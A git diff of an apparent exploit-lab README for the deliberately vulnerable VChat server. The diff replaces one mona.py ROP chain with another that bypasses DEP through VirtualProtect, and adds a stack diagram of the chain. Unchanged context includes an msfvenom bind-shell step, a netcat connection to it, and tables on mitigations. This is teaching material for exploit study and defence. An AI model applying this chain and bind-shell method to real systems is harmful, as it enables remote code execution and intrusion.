@@ -95,7 +95,7 @@ We will need to set up the stack so that it has the following signature when mak
 
 **Useful Notes**: 
 
-1. Ue the black button (*Go to Address*) to go to an address to set a breakpoint.
+1. Use the black button (*Go to Address*) within Immunity Debugger to go to an address to set a breakpoint.
 
 2. Locate a RETN instruction address and pick one that does not have the (READONLY) flag set.
 	```
@@ -155,75 +155,100 @@ The exploit works as follows. We first generate a ROP chain, a sequence of addre
 
     2. We can try executing this ROP chain by modifying the program to reflect the [exploit1.py](./SourceCode/exploit1.py) program. Below is the function in the `rop_chain.txt` function.
 
-   https://github.com/DaintyJet/VChat_TRUN_ROP/assets/60448620/84a9e576-4c96-48e7-a2cd-d242f148c27d
+```
+def create_rop_chain():
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+        #[---INFO:gadgets_to_set_esi:---]
+        0x76e494ee,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
+        0x76796164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
+        0x76333a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
+        #[---INFO:gadgets_to_set_ebp:---]
+        0x7671d3e6,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
+        0x766e77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
+        #[---INFO:gadgets_to_set_ebx:---]
+        0x7654252c,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+        0xfffffdff,  # Value to negate, will become 0x00000201
+        0x76e3c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        0x77043349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
+        #[---INFO:gadgets_to_set_edx:---]
+        0x7704320b,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
+        0xffffffc0,  # Value to negate, will become 0x00000040
+        0x76da1f0a,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
+        0x76d012db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
+        #[---INFO:gadgets_to_set_ecx:---]
+        0x752f4414,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+        0x62504802,  # &Writable location [Essfun.dll]
+        #[---INFO:gadgets_to_set_edi:---]
+        0x76d6eda4,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
+        0x76f077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
+        #[---INFO:gadgets_to_set_eax:---]
+        0x76f3e2d0,  # POP EAX # RETN [WS2_32.dll] ** REBASED ** ASLR 
+        0x90909090,  # nop
+        #[---INFO:pushad:---]
+        0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+```
+      * *Note*: We will need to modify the *return ''.join(struct.pack('<I', _) for _ in rop_gadgets)* above to be *return b''.join(struct.pack('<I', _) for _ in rop_gadgets)* as without converting it to a byte string with *b*, we will receive errors!
 
-      ```
-      def create_rop_chain():
-         # rop chain generated with mona.py - www.corelan.be
-         rop_gadgets = [
-            #[---INFO:gadgets_to_set_esi:---]
-            0x7699cfcf,  # POP ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR
-            0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
-            0x77083491,  # MOV ESI,DWORD PTR DS:[ESI] # ADD AL,0 # MOV EAX,8007007F # RETN 0x18 [KERNELBASE.dll] ** REBASED ** ASLR
-            #[---INFO:gadgets_to_set_ebp:---]
-            0x770988dc,  # POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR
-            0x41414141,  # Filler (RETN offset compensation)
-            0x41414141,  # Filler (RETN offset compensation)
-            0x41414141,  # Filler (RETN offset compensation)
-            0x41414141,  # Filler (RETN offset compensation)
-            0x41414141,  # Filler (RETN offset compensation)
-            0x41414141,  # Filler (RETN offset compensation)
-            0x625014e6,  # & jmp esp [essfunc.dll]
-            #[---INFO:gadgets_to_set_ebx:---]
-            0x77508b1d,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR
-            0xfffffdff,  # Value to negate, will become 0x00000201
-            0x7692da18,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
-            0x769a80d2,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR
-            #[---INFO:gadgets_to_set_edx:---]
-            0x7707f452,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
-            0xffffffc0,  # Value to negate, will become 0x00000040
-            0x76d39914,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
-            0x7743a4b2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR
-            #[---INFO:gadgets_to_set_ecx:---]
-            0x7678816a,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR
-            0x765e3bf2,  # &Writable location [WS2_32.dll] ** REBASED ** ASLR
-            #[---INFO:gadgets_to_set_edi:---]
-            0x7747e114,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR
-            0x765a77c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
-            #[---INFO:gadgets_to_set_eax:---]
-            0x77095618,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
-            0x90909090,  # nop
-            #[---INFO:pushad:---]
-            0x76f8af08,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR
-         ]
-         return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
-      # Example Declaration
-      rop_chain = create_rop_chain()
-      ```
-      * *Note*: We will need to modify the return to be `return b''.join(struct.pack('<I', _) for _ in rop_gadgets)` as without converting it to a byte string, we will receive errors!
+When *create_rop_chain()* runs, it fills up the stack as follows. Registers shown on the left indicate at which gadget a register is set.
 
-      1. Click on the black button highlighted below, and enter the address we decided for the `PUSHAD` instruction.
+```  
+          |              |
+          |     SHELL    |
+          ---------------
+          |  0x90909090  |
+                ...
+          |  0x90909090  |
+          ----------------
+          |              | PUSHAD # RETN
+          ----------------   
+          | 0x90909090   | 
+          ----------------   
+EAX       |              | POP EAX # RETN
+          ----------------   
+          | 0x76f077c7   | RETN (ROP NOP)
+          ----------------   
+EDI       |              | POP EDI # RETN
+          ----------------   
+ECX       | 0x62504802   | &Writable location
+          ----------------   
+          |              | POP ECX # RETN
+          ----------------   
+EDX       |              | XCHG EAX,EDX # RETN
+          ----------------   
+          |              | NEG EAX # RETN
+          ----------------   
+          | 0xffffffc0   | 
+          ----------------   
+          |              | POP EAX # RETN
+          ----------------   
+EBX       |              | XCHG EAX,EBX # RETN
+          ----------------   
+          |              | NEG EAX # RETN
+          ----------------   
+          | 0xfffffdff   |
+          ----------------   
+          |              | POP EAX # RETN
+          ----------------   
+          | 0x766e77c5   | & push esp # ret
+          ----------------   
+EBP       |              | POP EBP # RETN
+          ----------------   
+ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
+          ----------------   
+          | 0x76796164   | ptr to &VirtualProtect()    
+          ----------------   
+          |              | POP EBX # RETN
+          ----------------   
+          | ret addr     | -> retn
+          ---------------- <- ESP
+```
+Note: & means address of
 
-         <img src="Images/I12.png" width=600>
 
-      2. Set a breakpoint at the desired address (right-click). In this case, I chose `0x76F8AF08`, the address of our `PUSHAD` instruction.
-
-         <img src="Images/I25.png" width=600>
-
-      3. Run the [exploit1.py](./SourceCode/exploit1.py) program and observe the results in the registers.
-
-         <img src="Images/I26.png" width=600>
-
-      4. We can see this a little better when we step into the function call (If any of these do not match, there is a conflict between gadgets! You should look at the section [Previous Error](#previous-error)).
-
-         <img src="Images/I27.png" width=600>
-
-      5. Step through the function and ensure it jumps back to the stack, if you see a `RETN 18` following this will likely be a jump to some random point in the stack, and a raised exception (See the video Below). **Do Not** step into `VirtualProtect()` function use the *Step Over* operation as shown below. Otherwise, you will see an error in the video below. This is because following that execution path will lead into the kernel which is not allowed (Stopping execution in the kernel would be bad).
-
-         <img src="Images/I29.png" width=600>
-
-         * This is likely due to the fact Immunity Debugger will attempt to trace and follow the execution into the Kernel Mode which is not supported in Immunity Debugger and we would be attempting to debug the kernel of the machine we are running on! Below is a Video showing the error when we step into the function.
-
+To debug and see what happens when the ROP chain works, click on the black button within *Immunity Debugger* highlighted and enter an address, e.g., the address of *retn* used to overwrite the return address of the vunerable function.
 
 2. **Step 2: Generate bind shell**. Now we can add a payload to our exploit, this can be generated with [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html). We create a bind shell. This is a program that listens for connections on the target machine and provides a shell to anyone that makes a tcp connection to the port it is listening on. We can generate the shellcode with the following command.
 	```sh
@@ -250,8 +275,8 @@ nc 10.0.2.15 4444
 ```
 
 
-## Previous Error
-This section covers a previous error encountered when using a ROP chain generated with `mona.py`. In this case there was a collision between gadgets leading to a corrupted call stack.
+## ROP Chain Errors
+This section covers an error encountered when using a ROP chain generated with `mona.py` sometimes. In this case there was a collision between gadgets leading to a corrupted call stack. The ROP chain could be different every time it is generated.
 
 1. Using the [mona.py](https://github.com/corelan/mona) command, we generate a new ROP chain. This is necessary because gadgets located in modules with ASLR enabled are used.
    ```
@@ -348,6 +373,7 @@ The mitigations we will be using in the following examination are:
 * [SEHOP](https://github.com/DaintyJet/VChat_SEH): This is a protection for the Structured Exception Handing mechanism in Windows. It validates the integrity of the SEH chain during a runtime check.
 * [Control Flow Guard (CFG)](https://github.com/DaintyJet/VChat_CFG): This mitigation verifies that indirect calls or jumps are performed to locations contained in a table generated at compile time. Examples of indirect calls or jumps include function pointers being used to call a function or if you are using `C++` virtual functions, which would be considered indirect calls as you index a table of function pointers.
 * [Heap Integrity Validation](https://github.com/DaintyJet/VChat_Heap_Defense): This mitigation verifies the integrity of a heap when operations are performed on the heap itself, such as allocations or frees of heap objects.
+
 ### Individual Defenses: VChat Exploit
 |Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Space Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG)|
 |-|-|-|-|-|-|-|-|
@@ -370,6 +396,7 @@ The mitigations we will be using in the following examination are:
 * `Defense: Control Flow Guard`: This does not affect our exploit as we do not leverage indirect calls or jumps. 
 > [!NOTE]
 > `Defense: Buffer Security Check (GS)`: If the application improperly initializes the global security cookie or contains additional vulnerabilities that can leak values on the stack, then this mitigation strategy can be bypassed.
+
 ### Combined Defenses: VChat Exploit
 |Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Address Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Control Flow Guard (CFG)|
 |-|-|-|-|-|-|-|-|
@@ -378,88 +405,6 @@ The mitigations we will be using in the following examination are:
 > [!NOTE]
 > We omit repetitive rows representing ineffective mitigation strategies as their cases are already covered.
 
-```
-      #[---INFO:gadgets_to_set_esi:---]
-      0x76e494ee,  # POP EBX # RETN [combase.dll] ** REBASED ** ASLR 
-      0x76796164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
-      0x76333a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
-      #[---INFO:gadgets_to_set_ebp:---]
-      0x7671d3e6,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
-      0x766e77c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
-      #[---INFO:gadgets_to_set_ebx:---]
-      0x7654252c,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
-      0xfffffdff,  # Value to negate, will become 0x00000201
-      0x76e3c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
-      0x77043349,  # XCHG EAX,EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
-      #[---INFO:gadgets_to_set_edx:---]
-      0x7704320b,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
-      0xffffffc0,  # Value to negate, will become 0x00000040
-      0x76da1f0a,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
-      0x76d012db,  # XCHG EAX,EDX # RETN [combase.dll] ** REBASED ** ASLR 
-      #[---INFO:gadgets_to_set_ecx:---]
-      0x752f4414,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
-      0x62504802,  # &Writable location [Essfun.dll]
-      #[---INFO:gadgets_to_set_edi:---]
-      0x76d6eda4,  # POP EDI # RETN [combase.dll] ** REBASED ** ASLR 
-      0x76f077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
-      #[---INFO:gadgets_to_set_eax:---]
-      0x76f3e2d0,  # POP EAX # RETN [WS2_32.dll] ** REBASED ** ASLR 
-      0x90909090,  # nop
-      #[---INFO:pushad:---]
-      0x77043201,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
-```
-```  
-          |              |
-          |     SHELL    |
-          ---------------
-          |  0x90909090  |
-                ...
-          |  0x90909090  |
-          ----------------
-          |              | PUSHAD # RETN
-          ----------------   
-          | 0x90909090   | 
-          ----------------   
-EAX       |              | POP EAX # RETN
-          ----------------   
-          | 0x76f077c7   | RETN (ROP NOP)
-          ----------------   
-EDI       |              | POP EDI # RETN
-          ----------------   
-ECX       | 0x62504802   | &Writable location
-          ----------------   
-          |              | POP ECX # RETN
-          ----------------   
-EDX       |              | XCHG EAX,EDX # RETN
-          ----------------   
-          |              | NEG EAX # RETN
-          ----------------   
-          | 0xffffffc0   | 
-          ----------------   
-          |              | POP EAX # RETN
-          ----------------   
-EBX       |              | XCHG EAX,EBX # RETN
-          ----------------   
-          |              | NEG EAX # RETN
-          ----------------   
-          | 0xfffffdff   |
-          ----------------   
-          |              | POP EAX # RETN
-          ----------------   
-          | 0x766e77c5   | & push esp # ret
-          ----------------   
-EBP       |              | POP EBP # RETN
-          ----------------   
-ESI       |              | MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN
-          ----------------   
-          | 0x76796164   | ptr to &VirtualProtect()    
-          ----------------   
-          |              | POP EBX # RETN
-          ----------------   
-          | ret addr     | -> retn
-          ---------------- <- ESP
-```
-Note: & means address of
 
 
 ## Test code
